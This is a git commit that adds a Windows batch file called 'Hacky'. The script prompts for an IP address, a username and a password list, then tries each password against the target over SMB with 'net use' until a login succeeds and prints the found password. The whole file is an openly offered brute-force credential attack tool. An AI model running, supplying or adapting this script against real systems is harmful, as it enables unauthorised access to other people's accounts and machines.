d0784b4caf26a52ee056a663c578cd065ffc93f6
Abdullah <umarabdullahali2020@gmail.com>
2025-04-05 10:51:36 +0500

    Add files via upload

---
+++ Hacky/Hacky.bat.bat
@@ -0,0 +1,39 @@
+@echo off
+title Hacky
+color A
+echo.
+echo        ======================================
+echo.
+echo                1) Hack
+echo                2) Exit_hacky
+echo.
+echo       ======================================
+echo.
+choice /c 12
+if %errorlevel% EQU 1 goto game
+if %errorlevel% EQU 2 exit
+:game
+cls
+set /p ip="Enter IP Address: "
+set /p user="Enter Username: "
+set /p wordlist="Enter Password List: "
+
+for /f %%a in (%wordlist%) do (
+  set pass=%%a
+  call :attempt
+)
+echo Password not Found :(
+pause
+exit
+
+:success
+echo.
+echo Password Found! %pass%
+net use \\%ip% /d /y >nul 2>&1
+pause
+exit
+
+:attempt
+net use \\%ip% /user:%user% %pass% >nul 2>&1
+echo ATTEMPT : %pass%
+if %errorlevel% EQU 0 goto success
